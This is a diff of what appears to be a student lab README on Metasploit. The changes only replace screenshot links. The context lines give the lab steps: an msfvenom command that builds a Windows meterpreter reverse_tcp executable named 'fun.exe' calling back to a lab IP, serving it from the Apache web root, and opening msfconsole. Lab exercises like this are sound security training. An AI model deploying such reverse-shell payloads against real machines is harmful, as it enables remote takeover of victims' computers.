@@ -27,22 +27,24 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 
 ## OUTPUT:
-![Screenshot 2024-10-09 082740](https://github.com/user-attachments/assets/81af2218-803e-47da-9669-4e2aec5cdd2f)
+![Screenshot 2024-10-30 084351](https://github.com/user-attachments/assets/c13ae138-865e-4a0c-aa73-cb16bcab572a)
 
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
-![Screenshot 2024-10-09 082751](https://github.com/user-attachments/assets/383824da-ba51-4cdf-8eb4-465f27d8c497)
+![Screenshot 2024-10-30 084404](https://github.com/user-attachments/assets/0d4bf214-1c2d-4239-83ca-c7a8ab4aef08)
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
-![Screenshot 2024-10-09 082806](https://github.com/user-attachments/assets/29e47a0d-a590-4835-8386-a24e243b9f9e)
+![Screenshot 2024-10-30 084413](https://github.com/user-attachments/assets/21ab6ec8-d9aa-47b9-a2d2-cdfff4b1c690)
+
 
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
-![Screenshot 2024-10-09 082817](https://github.com/user-attachments/assets/d47682b3-0a5a-42e8-8c3d-2a24655d24a5)
+![Screenshot 2024-10-30 084419](https://github.com/user-attachments/assets/962ebb97-efcd-462e-bfa5-6c2397d28e09)
+
 
 Check the status of apache2
 ## OUTPUT:
@@ -50,7 +52,7 @@ Check the status of apache2
 
 Invoke msfconsole:
 ## OUTPUT:
-![Screenshot 2024-10-09 082849](https://github.com/user-attachments/assets/4c8b88db-e116-4022-9fdb-f4ae29353850)
+![Screenshot 2024-10-30 084437](https://github.com/user-attachments/assets/47538d80-0d1b-41f2-95d8-6407caa05d29)
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
